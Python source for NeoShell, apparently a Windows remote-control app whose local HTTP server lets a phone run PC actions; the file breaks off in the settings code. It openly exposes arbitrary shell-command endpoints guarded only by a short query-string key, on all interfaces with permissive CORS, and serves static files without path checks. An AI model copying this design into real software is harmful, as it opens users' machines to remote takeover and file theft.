#!/usr/bin/env python3
import sys
import os
import json
import socket
import urllib.parse
import urllib.request
import subprocess
import threading
import webbrowser
import secrets
import string
import ctypes
import time
from pathlib import Path
from datetime import datetime
from io import BytesIO
import asyncio
import winsdk.windows.media.control as wmc

from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
import psutil


try:
    kernel32 = ctypes.windll.kernel32
    mutex = kernel32.CreateMutexW(None, False, "NeoShell_SingleInstance_Mutex")
    if kernel32.GetLastError() == 183:
        sys.exit(0)
except:
    pass


from PyQt6.QtCore import (Qt, QTimer, QPoint, QUrl, pyqtSignal, QByteArray,
                          QPropertyAnimation, QEasingCurve, QVariantAnimation)
from PyQt6.QtGui import (QColor, QPainter, QPainterPath, QPen, QIcon,
                         QAction, QDesktopServices, QPixmap)
from PyQt6.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout,
                             QPushButton, QLabel, QSystemTrayIcon, QMenu,
                             QLineEdit, QFrame, QStackedWidget,
                             QCheckBox, QFileDialog)
from PyQt6.QtSvgWidgets import QSvgWidget

from http.server import HTTPServer, BaseHTTPRequestHandler

import qrcode
from PIL import Image, ImageDraw


if getattr(sys, 'frozen', False):
    BASE_DIR = Path(sys.executable).parent
else:
    BASE_DIR = Path(__file__).parent

APPS_DIR = BASE_DIR / "NeoShellApps"
APPS_DIR.mkdir(parents=True, exist_ok=True)

CONFIG_DIR = BASE_DIR / ".neoshell"
CONFIG_FILE = CONFIG_DIR / "config.json"
CONFIG_DIR.mkdir(parents=True, exist_ok=True)

STATIC_DIR = BASE_DIR / "static"
STATIC_DIR.mkdir(parents=True, exist_ok=True)

LOGO_PATH = STATIC_DIR / "logo.png"
ICON_PATH = STATIC_DIR / "icon.png"


CURRENT_VERSION = '2.3'
GITHUB_REPO = 'rud1x/NeoShell'
GITHUB_API = f'https://api.github.com/repos/{GITHUB_REPO}/releases/latest'
GITHUB_RELEASES = f'https://github.com/{GITHUB_REPO}/releases/latest'


def generate_random_key(length=8):
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))


def load_config():
    if not CONFIG_FILE.exists():
        default_config = {
            "secret_key": generate_random_key(),
            "port": 8000,
            "apps_path": str(APPS_DIR),
            "auto_start": False,
            "auto_start_server": True
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(default_config, f, indent=2)
        return default_config.copy()
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)


def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)


config = load_config()
SECRET_KEY = config["secret_key"]
PORT = config["port"]
APPS_DIR = Path(config["apps_path"])
APPS_DIR.mkdir(parents=True, exist_ok=True)


def compare_versions(a, b):
    try:
        pa = [int(x) for x in a.split('.')]
        pb = [int(x) for x in b.split('.')]
        for i in range(max(len(pa), len(pb))):
            na = pa[i] if i < len(pa) else 0
            nb = pb[i] if i < len(pb) else 0
            if na > nb: return 1
            if na < nb: return -1
        return 0
    except:
        return 0


def check_for_updates():
    try:
        req = urllib.request.Request(GITHUB_API, headers={'User-Agent': 'NeoShell'})
        with urllib.request.urlopen(req, timeout=6) as response:
            data = json.loads(response.read().decode('utf-8'))

        latest = (data.get('tag_name') or '').replace('v', '')
        if not latest:
            return

        if compare_versions(latest, CURRENT_VERSION) > 0:
            time.sleep(3)
            webbrowser.open(GITHUB_RELEASES)

    except Exception as e:
        print(f"Update check failed: {e}")


def _get_volume_interface():
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    from comtypes import CLSCTX_ALL
    from ctypes import cast, POINTER
    
    devices = AudioUtilities.GetSpeakers()

    if hasattr(devices, 'EndpointVolume'):
        return devices.EndpointVolume

    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    return cast(interface, POINTER(IAudioEndpointVolume))


def get_volume():
    try:
        volume = _get_volume_interface()
        return {
            "success": True,
            "level": int(volume.GetMasterVolumeLevelScalar() * 100),
            "muted": bool(volume.GetMute())
        }
    except Exception as e:
        return {"success": False, "error": str(e), "level": 0, "muted": False}


def set_volume(level):
    try:
        level = max(0, min(100, int(level)))
        volume = _get_volume_interface()
        volume.SetMasterVolumeLevelScalar(level / 100.0, None)
        if volume.GetMute():
            volume.SetMute(0, None)
        return {"success": True, "level": level}
    except Exception as e:
        return {"success": False, "error": str(e)}


def toggle_mute():
    try:
        volume = _get_volume_interface()
        current = volume.GetMute()
        volume.SetMute(not current, None)
        return {"success": True, "muted": bool(not current)}
    except Exception as e:
        return {"success": False, "error": str(e)}




def get_cpu_temp():
    try:
        import wmi
        w = wmi.WMI(namespace="root\\OpenHardwareMonitor")
        sensors = w.Sensor()
        for sensor in sensors:
            if sensor.SensorType == 'Temperature' and 'CPU' in sensor.Name:
                return int(sensor.Value)
    except:
        pass
    return None


def get_monitor_data():
    try:
        cpu = psutil.cpu_percent(interval=0.1)
        ram = psutil.virtual_memory().percent
        disk = psutil.disk_usage('C:\\').percent
        temp = get_cpu_temp()

        return {
            "success": True,
            "cpu": round(cpu, 1),
            "ram": round(ram, 1),
            "disk": round(disk, 1),
            "temp": temp
        }
    except Exception as e:
        return {"success": False, "error": str(e), "cpu": 0, "ram": 0, "disk": 0, "temp": None}



def recolor_icon(image_path, target_color):
    try:
        img = Image.open(image_path).convert("RGBA")
        data = img.getdata()
        new_data = []
        for item in data:
            if item[0] > 200 and item[1] > 200 and item[2] > 200 and item[3] > 0:
                new_data.append((target_color[0], target_color[1], target_color[2], item[3]))
            elif item[0] > 200 and item[1] > 200 and item[2] > 200:
                new_data.append((target_color[0], target_color[1], target_color[2], item[3]))
            else:
                new_data.append(item)
        img.putdata(new_data)
        output = BytesIO()
        img.save(output, format='PNG')
        output.seek(0)
        pixmap = QPixmap()
        pixmap.loadFromData(output.getvalue())
        return QIcon(pixmap)
    except:
        return None


def get_default_icon():
    img = Image.new('RGBA', (64, 64), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    draw.ellipse((8, 8, 56, 56), fill='#ffcc00')
    draw.text((25, 20), "N", fill='#0A0A0C')
    output = BytesIO()
    img.save(output, format='PNG')
    output.seek(0)
    pixmap = QPixmap()
    pixmap.loadFromData(output.getvalue())
    return QIcon(pixmap)


def kill_process_on_port(port):
    try:
        result = subprocess.run(f'netstat -ano | findstr :{port}', capture_output=True, text=True, shell=True)
        pids = set()
        for line in result.stdout.strip().split('\n'):
            if 'LISTENING' in line:
                parts = line.split()
                if parts:
                    pids.add(parts[-1])
        for pid in pids:
            subprocess.run(f'taskkill /F /PID {pid}', shell=True, capture_output=True)
        return True
    except:
        return False


def open_firewall_port(port):
    try:
        subprocess.run(f'netsh advfirewall firewall add rule name="NeoShell ({port})" dir=in action=allow protocol=TCP localport={port}', shell=True, capture_output=True)
    except:
        pass


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def run_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return {"success": r.returncode == 0, "output": r.stdout.strip()}
    except:
        return {"success": False, "output": "Command failed"}


def add_to_startup():
    try:
        import winreg
        exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.executable
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "NeoShell", 0, winreg.REG_SZ, f'"{exe_path}" --hidden')
        return True
    except:
        return False


def remove_from_startup():
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.DeleteValue(regkey, "NeoShell")
        return True
    except:
        return False


async def get_media_session():
    try:
        session_manager = await wmc.GlobalSystemMediaTransportControlsSessionManager.request_async()
        return session_manager.get_current_session()
    except:
        return None


def run_async(coro):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop.run_until_complete(coro)
    except:
        return None


def media_play_pause():
    session = run_async(get_media_session())
    if session:
        run_async(session.try_toggle_play_pause_async())
        return True
    return False


def media_next():
    session = run_async(get_media_session())
    if session:
        run_async(session.try_skip_next_async())
        return True
    return False


def media_prev():
    session = run_async(get_media_session())
    if session:
        run_async(session.try_skip_previous_async())
        return True
    return False


def media_stop():
    session = run_async(get_media_session())
    if session:
        run_async(session.try_stop_async())
        return True
    return False


def get_current_track():
    session = run_async(get_media_session())
    if not session:
        return {"success": False, "error": "No active media session"}

    info = run_async(session.try_get_media_properties_async())
    if not info:
        return {"success": False, "error": "No track info"}

    playback_info = session.get_playback_info()
    is_playing = False
    if playback_info:
        is_playing = (playback_info.playback_status.value == 4)

    return {
        "success": True,
        "title": info.title or "",
        "artist": info.artist or "",
        "album": info.album_title or "",
        "is_playing": is_playing
    }


class NeoShellHandler(BaseHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Device-Key, Authorization')
        self.send_header('Access-Control-Max-Age', '86400')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Device-Key, Authorization')
        self.send_header('Access-Control-Max-Age', '86400')
        self.end_headers()

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)

        if path == '/api/status':
            key = query.get('key', [''])[0]
            if key != SECRET_KEY:
                self.send_response(401)
                self.end_headers()
                return
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "online", "time": datetime.now().isoformat()}).encode())
            return

        if path == '/api/ping':
            key = query.get('key', [''])[0]
            if key != SECRET_KEY:
                self.send_response(401)
                self.end_headers()
                return
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                "online": True,
                "ip": get_local_ip(),
                "name": socket.gethostname()
            }).encode())
            return

        if path == '/api/media/now':
            key = query.get('key', [''])[0]
            if key != SECRET_KEY:
                self.send_response(401)
                self.end_headers()
                return
            track_info = get_current_track()
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(track_info).encode())
            return

        if path == '/api/volume/get':
            key = query.get('key', [''])[0]
            if key != SECRET_KEY:
                self.send_response(401)
                self.end_headers()
                return
            result = get_volume()
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
            return

        if path == '/api/monitor':
            key = query.get('key', [''])[0]
            if key != SECRET_KEY:
                self.send_response(401)
                self.end_headers()
                return
            result = get_monitor_data()
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
            return

        if path == '/api/apps':
            key = query.get('key', [''])[0]
            if key != SECRET_KEY:
                self.send_response(401)
                self.end_headers()
                return
            apps = []
            apps_path = Path(APPS_DIR)
            if apps_path.exists():
                for f in apps_path.iterdir():
                    if f.suffix.lower() in ['.lnk', '.url', '.exe', '.bat']:
                        apps.append({"name": f.stem, "file": f.name})
            else:
                apps_path.mkdir(parents=True, exist_ok=True)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"apps": sorted(apps, key=lambda x: x["name"]), "path": str(apps_path)}).encode())
            return

        if path == '/manifest.json':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            manifest = {
                "name": "NeoShell",
                "short_name": "NeoShell",
                "description": "Remote PC Control",
                "start_url": "/",
                "display": "standalone",
                "theme_color": "#ffcc00",
                "background_color": "#0a0a0a",
                "icons": [
                    {"src": "/static/icon-192.png", "sizes": "192x192", "type": "image/png"},
                    {"src": "/static/icon-512.png", "sizes": "512x512", "type": "image/png"}
                ]
            }
            self.wfile.write(json.dumps(manifest).encode())
            return

        if path == '/' or path == '':
            path = '/index.html'

        file_path = path.lstrip('/')
        full_path = STATIC_DIR / file_path

        if full_path.exists() and full_path.is_file():
            self.send_response(200)
            if file_path.endswith('.html'):
                self.send_header('Content-type', 'text/html; charset=utf-8')
            elif file_path.endswith('.css'):
                self.send_header('Content-type', 'text/css')
            elif file_path.endswith('.js'):
                self.send_header('Content-type', 'application/javascript')
            elif file_path.endswith('.png'):
                self.send_header('Content-type', 'image/png')
            elif file_path.endswith('.json'):
                self.send_header('Content-type', 'application/json')
            self.end_headers()
            with open(full_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 Not Found')

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)

        key = query.get('key', [''])[0]
        if key != SECRET_KEY:
            self.send_response(401)
            self.end_headers()
            return

        response = {"success": True}

        if path == '/api/lock':
            run_cmd('rundll32.exe user32.dll,LockWorkStation')

        elif path == '/api/sleep':
            run_cmd('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')

        elif path == '/api/shutdown':
            run_cmd('shutdown /s /t 10')

        elif path == '/api/reboot':
            run_cmd('shutdown /r /t 10')

        elif path == '/api/minimize_all':
            run_cmd('powershell -c "(New-Object -ComObject Shell.Application).minimizeall()"')

        elif path == '/api/task_manager':
            run_cmd('start taskmgr')

        elif path == '/api/close_app':
            run_cmd('powershell -c "(New-Object -ComObject WScript.Shell).SendKeys(\'%{F4}\')"')

        elif path == '/api/explorer':
            run_cmd('explorer')

        elif path == '/api/open_browser':
            query_str = urllib.parse.unquote(query.get('query', [''])[0]) if query.get('query') else ''
            if query_str:
                if query_str.startswith(('http://', 'https://')):
                    run_cmd(f'start "" "{query_str}"')
                else:
                    encoded = urllib.parse.quote_plus(query_str)
                    run_cmd(f'start "" "https://www.google.com/search?q={encoded}"')

        elif path == '/api/media/playpause':
            media_play_pause()

        elif path == '/api/media/next':
            media_next()

        elif path == '/api/media/prev':
            media_prev()

        elif path == '/api/media/stop':
            media_stop()

        elif path == '/api/volume/set':
            level = int(query.get('level', ['50'])[0])
            response = set_volume(level)

        elif path == '/api/volume/mute':
            response = toggle_mute()

        elif path == '/api/command':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length) if content_length > 0 else b'{}'
            try:
                data = json.loads(post_data.decode('utf-8'))
                cmd = data.get('cmd', '')
                if cmd:
                    result = run_cmd(cmd)
                    response = {"success": result["success"], "output": result.get("output", "")}
                else:
                    response = {"success": False, "error": "No command"}
            except Exception as e:
                response = {"success": False, "error": str(e)}

        elif path == '/api/command/batch':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length) if content_length > 0 else b'{}'
            try:
                data = json.loads(post_data.decode('utf-8'))
                commands = data.get('commands', [])
                results = []
                for cmd in commands:
                    if cmd.strip():
                        r = run_cmd(cmd)
                        results.append({"cmd": cmd, "success": r["success"]})
                response = {"success": True, "results": results}
            except Exception as e:
                response = {"success": False, "error": str(e)}

        elif path.startswith('/api/run/'):
            filename = urllib.parse.unquote(path.split('/')[-1])
            file_path = APPS_DIR / filename
            if file_path.exists():
                os.startfile(str(file_path))

        elif path == '/api/open_apps_folder':
            subprocess.Popen(f'explorer "{APPS_DIR}"', shell=True)

        else:
            self.send_response(404)
            self.end_headers()
            return

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())

    def log_message(self, format, *args):
        pass


server = None
server_thread = None
server_running = False


def start_server():
    global server, server_thread, server_running
    try:
        kill_process_on_port(PORT)
        server = HTTPServer(('0.0.0.0', PORT), NeoShellHandler)
        server_running = True
        server.serve_forever()
    except Exception as e:
        print(f"Server error: {e}")
        server_running = False


def stop_server():
    global server, server_running
    if server:
        server.shutdown()
        server.server_close()
        server = None
    server_running = False
    kill_process_on_port(PORT)


class AnimatedLogo(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedSize(160, 160)
        self.is_running = False
        self.animation_value = 0
        self.setup_animation()

    def setup_animation(self):
        self.anim = QVariantAnimation(self)
        self.anim.setDuration(1800)
        self.anim.setStartValue(0.0)
        self.anim.setEndValue(1.0)
        self.anim.setLoopCount(-1)
        self.anim.valueChanged.connect(self.on_animation)
        self.anim.setEasingCurve(QEasingCurve.Type.InOutSine)

    def start_glow(self):
        self.is_running = True
        self.anim.start()

    def stop_glow(self):
        self.is_running = False
        self.anim.stop()
        self.animation_value = 0
        self.update()

    def on_animation(self, value):
        self.animation_value = value
        self.update()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        p.setRenderHint(QPainter.RenderHint.SmoothPixmapTransform)

        w = self.width()
        h = self.height()
        box_size = 120
        box_x = (w - box_size) // 2
        box_y = (h - box_size) // 2
        radius = 30

        if self.is_running:
            glow_strength = 0.4 + 0.6 * self.animation_value

            for i in range(5, 0, -1):
                offset = i * 5
                alpha = int(40 * glow_strength / i)
                p.setPen(Qt.PenStyle.NoPen)
                p.setBrush(QColor(255, 204, 0, alpha))
                p.drawRoundedRect(
                    box_x - offset, box_y - offset,
                    box_size + offset * 2, box_size + offset * 2,
                    radius + offset, radius + offset
                )

            bg_color = QColor(255, 204, 0)
        else:
            for i in range(4, 0, -1):
                offset = i * 4
                alpha = int(30 / i)
                p.setPen(Qt.PenStyle.NoPen)
                p.setBrush(QColor(239, 68, 68, alpha))
                p.drawRoundedRect(
                    box_x - offset, box_y - offset,
                    box_size + offset * 2, box_size + offset * 2,
                    radius + offset, radius + offset
                )

            bg_color = QColor(239, 68, 68)

        p.setPen(Qt.PenStyle.NoPen)
        p.setBrush(bg_color)
        p.drawRoundedRect(box_x, box_y, box_size, box_size, radius, radius)

        padding = 20
        inner_size = box_size - padding * 2

        if LOGO_PATH.exists():
            pixmap = QPixmap(str(LOGO_PATH))
            if not pixmap.isNull():
                scaled = pixmap.scaled(
                    inner_size, inner_size,
                    Qt.AspectRatioMode.KeepAspectRatio,
                    Qt.TransformationMode.SmoothTransformation
                )
                draw_x = box_x + (box_size - scaled.width()) // 2
                draw_y = box_y + (box_size - scaled.height()) // 2
                p.drawPixmap(draw_x, draw_y, scaled)
            else:
                p.setPen(QPen(QColor(10, 10, 12), 1))
                font = p.font()
                font.setPointSize(48)
                font.setBold(True)
                p.setFont(font)
                p.drawText(
                    box_x, box_y, box_size, box_size,
                    Qt.AlignmentFlag.AlignCenter,
                    "N"
                )
        else:
            p.setPen(QPen(QColor(10, 10, 12), 1))
            font = p.font()
            font.setPointSize(48)
            font.setBold(True)
            p.setFont(font)
            p.drawText(
                box_x, box_y, box_size, box_size,
                Qt.AlignmentFlag.AlignCenter,
                "N"
            )

    def mousePressEvent(self, event):
        pass


class BackButton(QPushButton):
    clicked = pyqtSignal()

    def __init__(self):
        super().__init__("←")
        self.setFixedSize(32, 32)
        self.setCursor(Qt.CursorShape.PointingHandCursor)
        self.setStyleSheet("""
            QPushButton {
                background: transparent;
                color: #ffcc00;
                border: 2px solid #ffcc00;
                border-radius: 8px;
                font-size: 18px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #ffcc00;
                color: #0A0A0C;
            }
        """)

    def mouseReleaseEvent(self, e):
        if e.button() == Qt.MouseButton.LeftButton:
            self.clicked.emit()


def ensure_static_files():
    index_path = STATIC_DIR / "index.html"
    if not index_path.exists():
        html_content = """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>NeoShell</title></head>
<body style="background:#0A0A0C;color:#ffcc00;font-family:sans-serif;padding:20px;">
<h1>NeoShell</h1>
<p>Сервер работает. Откройте приложение NeoShell на телефоне.</p>
</body>
</html>"""
        index_path.write_text(html_content, encoding='utf-8')


class NeoShell(QWidget):
    def __init__(self):
        super().__init__()
        if sys.platform == "win32":
            try:
                ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("NeoShell.Control.1.0")
            except:
                pass

        icon_path = BASE_DIR / "neoshell.ico"
        if icon_path.exists():
            self.setWindowIcon(QIcon(str(icon_path)))
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint)
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        self.setFixedSize(360, 620)

        self._drag_pos = None
        ensure_static_files()

        self._setup_ui()
        self._setup_tray()

        self.status_timer = QTimer(self)
        self.status_timer.timeout.connect(self._update_status)
        self.status_timer.start(2000)

        if config.get("auto_start_server", True):
            QTimer.singleShot(500, self._auto_start_server)

        self._update_status()

    def _setup_ui(self):
        self.main_widget = QWidget(self)
        self.main_widget.setFixedSize(358, 618)
        self.main_widget.move(1, 1)

        self.stacked = QStackedWidget(self.main_widget)
        self.stacked.setGeometry(0, 0, 358, 618)
        self.stacked.setStyleSheet("background: transparent;")

        self.main_page = self._create_main_page()
        self.settings_page = self._create_settings_page()
        self.qr_page = self._create_qr_page()

        self.stacked.addWidget(self.main_page)
        self.stacked.addWidget(self.settings_page)
        self.stacked.addWidget(self.qr_page)

        self.stacked.setCurrentWidget(self.main_page)

    def _create_header(self, title, show_back=False):
        header = QWidget()
        header.setFixedHeight(55)
        header.setStyleSheet("background: transparent;")
        layout = QHBoxLayout(header)
        layout.setContentsMargins(15, 10, 15, 10)
        layout.setSpacing(10)

        if show_back:
            back_btn = BackButton()
            back_btn.clicked.connect(lambda: self.stacked.setCurrentWidget(self.main_page))
            layout.addWidget(back_btn)
        else:
            spacer = QWidget()
            spacer.setFixedSize(32, 32)
            layout.addWidget(spacer)

        title_label = QLabel(title)
        title_label.setStyleSheet("color: #ffcc00; font-size: 14px; font-weight: 900; letter-spacing: 3px; background: transparent;")
        layout.addWidget(title_label, alignment=Qt.AlignmentFlag.AlignCenter)
        layout.addStretch()

        min_btn = QPushButton("—")
        min_btn.setFixedSize(32, 32)
        min_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        min_btn.setStyleSheet("""
            QPushButton {
                background: transparent;
                color: #ffcc00;
                border: 2px solid #ffcc00;
                border-radius: 8px;
                font-size: 18px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #ffcc00;
                color: #0A0A0C;
            }
        """)
        min_btn.clicked.connect(self.showMinimized)

        close_btn = QPushButton("✕")
        close_btn.setFixedSize(32, 32)
        close_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        close_btn.setStyleSheet("""
            QPushButton {
                background: transparent;
                color: #ffcc00;
                border: 2px solid #ffcc00;
                border-radius: 8px;
                font-size: 18px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #ff4444;
                color: #FFFFFF;
                border-color: #ff4444;
            }
        """)
        close_btn.clicked.connect(self.hide)

        layout.addWidget(min_btn)
        layout.addWidget(close_btn)
        return header

    def _create_main_page(self):
        page = QWidget()
        page.setStyleSheet("background: transparent;")
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        header = self._create_header("NEOSHELL", show_back=False)
        layout.addWidget(header)

        layout.addStretch()

        self.logo = AnimatedLogo()
        layout.addWidget(self.logo, alignment=Qt.AlignmentFlag.AlignCenter)

        self.status_label = QLabel("SERVER STOPPED")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_label.setStyleSheet("color: #ff4444; font-size: 13px; font-weight: 700; letter-spacing: 2px; background: transparent; margin-top: 20px;")
        layout.addWidget(self.status_label, alignment=Qt.AlignmentFlag.AlignCenter)

        self.status_info = QLabel("Нажмите START чтобы запустить")
        self.status_info.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_info.setStyleSheet("color: #666; font-size: 11px; background: transparent; margin-top: 6px;")
        layout.addWidget(self.status_info, alignment=Qt.AlignmentFlag.AlignCenter)

        layout.addStretch()

        self.buttons_container = QWidget()
        buttons_layout = QVBoxLayout(self.buttons_container)
        buttons_layout.setContentsMargins(25, 0, 25, 30)
        buttons_layout.setSpacing(12)

        self.main_btn = QPushButton("START SERVER")
        self.main_btn.setFixedSize(310, 58)
        self.main_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.main_btn.clicked.connect(self._toggle_server)
        self.main_btn.setStyleSheet("""
            QPushButton {
                background: #121214;
                color: #ffcc00;
                border-radius: 18px;
                font-weight: 800;
                font-size: 13px;
                letter-spacing: 1px;
                border: 2px solid #ffcc00;
            }
            QPushButton:hover {
                background: #ffcc00;
                color: #0A0A0C;
            }
        """)
        buttons_layout.addWidget(self.main_btn, alignment=Qt.AlignmentFlag.AlignCenter)

        self.connect_btn = QPushButton("ПОДКЛЮЧИТЬ ТЕЛЕФОН")
        self.connect_btn.setFixedSize(310, 58)
        self.connect_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.connect_btn.clicked.connect(lambda: self.stacked.setCurrentWidget(self.qr_page))
        self.connect_btn.setStyleSheet("""
            QPushButton {
                background: rgba(255, 204, 0, 0.1);
                color: #ffcc00;
                border-radius: 18px;
                font-weight: 800;
                font-size: 13px;
                letter-spacing: 1px;
                border: 2px solid rgba(255, 204, 0, 0.3);
            }
            QPushButton:hover {
                background: #ffcc00;
                color: #0A0A0C;
                border-color: #ffcc00;
            }
        """)
        self.connect_btn.setVisible(False)
        buttons_layout.addWidget(self.connect_btn)

        settings_btn = QPushButton("НАСТРОЙКИ")
        settings_btn.setFixedSize(310, 58)
        settings_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        settings_btn.clicked.connect(lambda: self.stacked.setCurrentWidget(self.settings_page))
        settings_btn.setStyleSheet("""
            QPushButton {
                background: rgba(255, 255, 255, 0.03);
                color: #888;
                border-radius: 18px;
                font-weight: 700;
                font-size: 13px;
                letter-spacing: 1px;
                border: 1px solid rgba(255, 255, 255, 0.06);
            }
            QPushButton:hover {
                background: rgba(255, 255, 255, 0.08);
                color: #fff;
                border-color: rgba(255, 255, 255, 0.15);
            }
        """)
        buttons_layout.addWidget(settings_btn)

        layout.addWidget(self.buttons_container)

        return page

    def _create_settings_page(self):
        page = QWidget()
        page.setStyleSheet("background: transparent;")
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        header = self._create_header("НАСТРОЙКИ", show_back=True)
        layout.addWidget(header)

        content = QWidget()
        content_layout = QVBoxLayout(content)
        content_layout.setContentsMargins(25, 20, 25, 20)
        content_layout.setSpacing(15)

        port_label = QLabel("PORT")
        port_label.setStyleSheet("color: #ffcc00; font-size: 11px; font-weight: bold; letter-spacing: 1px;")
        content_layout.addWidget(port_label)

        self.port_input = QLineEdit()
        self.port_input.setText(str(PORT))
        self.port_input.setStyleSheet("""
            QLineEdit {
                background: #151518;
                color: #ffcc00;
                border: 2px solid #ffcc00;
                border-radius: 12px;
                padding: 12px;
                font-size: 13px;
            }
        """)
        content_layout.addWidget(self.port_input)

        key_label = QLabel("SECRET KEY")
        key_label.setStyleSheet("color: #ffcc00; font-size: 11px; font-weight: bold; letter-spacing: 1px; margin-top: 10px;")
        content_layout.addWidget(key_label)

        self.key_input = QLineEdit()
        self.key_input.setText(SECRET_KEY)
        self.key_input.setStyleSheet("""
            QLineEdit {
                background: #151518;
                color: #ffcc00;
                border: 2px solid #ffcc00;
                border-radius: 12px;
                padding: 12px;
                font-size: 13px;
                font-family: monospace;
            }
        """)
        content_layout.addWidget(self.key_input)

        apps_label = QLabel("APPS FOLDER")
        apps_label.setStyleSheet("color: #ffcc00; font-size: 11px; font-weight: bold; letter-spacing: 1px; margin-top: 10px;")
        content_layout.addWidget(apps_label)

        folder_layout = QHBoxLayout()
        self.apps_input = QLineEdit()
        self.apps_input.setText(str(APPS_DIR))
        self.apps_input.setStyleSheet("""
            QLineEdit {
                background: #151518;
                color: #ffcc00;
                border: 2px solid #ffcc00;
                border-radius: 12px;
                padding: 12px;
                font-size: 12px;
            }
        """)
        folder_layout.addWidget(self.apps_input)

        browse_btn = QPushButton("...")
        browse_btn.setFixedSize(45, 45)
        browse_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        browse_btn.clicked.connect(self._browse_folder)
        browse_btn.setStyleSheet("""
            QPushButton {
                background: #1A1A1D;
                color: #ffcc00;
                border-radius: 12px;
                font-size: 14px;
                font-weight: bold;
                border: 1px solid #ffcc00;
            }
            QPushButton:hover {
                background: #ffcc00;
                color: #0A0A0C;
            }
        """)
        folder_layout.addWidget(browse_btn)
        content_layout.addLayout(folder_layout)

        self.auto_start_cb = QCheckBox("Run on Windows startup")
        self.auto_start_cb.setChecked(config.get("auto_start", False))
        self.auto_start_cb.setStyleSheet("""
            QCheckBox { color: #ffcc00; spacing: 10px; }
            QCheckBox::indicator { width: 18px; height: 18px; border-radius: 4px; border: 2px solid #ffcc00; background: #151518; }
            QCheckBox::indicator:checked { background: #ffcc00; }
        """)
        content_layout.addWidget(self.auto_start_cb)

        self.auto_server_cb = QCheckBox("Auto-start server on program start")
        self.auto_server_cb.setChecked(config.get("auto_start_server", True))
        self.auto_server_cb.setStyleSheet("""
            QCheckBox { color: #ffcc00; spacing: 10px; }
            QCheckBox::indicator { width: 18px; height: 18px; border-radius: 4px; border: 2px solid #ffcc00; background: #151518; }
            QCheckBox::indicator:checked { background: #ffcc00; }
        """)
        content_layout.addWidget(self.auto_server_cb)

